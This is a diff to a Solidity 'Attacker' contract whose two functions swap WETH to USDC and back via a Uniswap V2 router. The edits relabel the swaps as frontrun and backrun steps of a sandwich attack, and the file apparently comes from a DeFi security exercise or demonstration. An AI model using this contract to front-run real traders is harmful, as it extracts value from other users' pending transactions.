@@ -23,13 +23,13 @@ contract Attacker {
         path[0] = weth;
         path[1] = usdc;
 
-        //Storing the attackers WETH balance
+        //Storing the attackers WETH balance. 
         uint256 attackersWethBalance = IERC20(weth).balanceOf(address(this));
 
         //Approving the router to spend on-behalf of Attacker.
         IERC20(weth).approve(router, attackersWethBalance);
 
-        //Performing the swap.
+        //Performing the frontrun swap.
         IUniswapV2Router(router).swapExactTokensForTokens(attackersWethBalance, 0, path, address(this), deadline);
     }
 
@@ -42,12 +42,13 @@ contract Attacker {
         path[0] = usdc;
         path[1] = weth;
 
-        //Storing the attackers USDC balance
+        //Storing the attackers USDC balance. 
         uint256 attackersUsdcBalance = IERC20(usdc).balanceOf(address(this));
 
         //Approving the router to spend on-behalf of Attacker.
         IERC20(usdc).approve(router, attackersUsdcBalance);
 
+        //Performing the backrun swap.
         IUniswapV2Router(router).swapExactTokensForTokens(attackersUsdcBalance, 0, path, address(this), deadline);
     }
 }
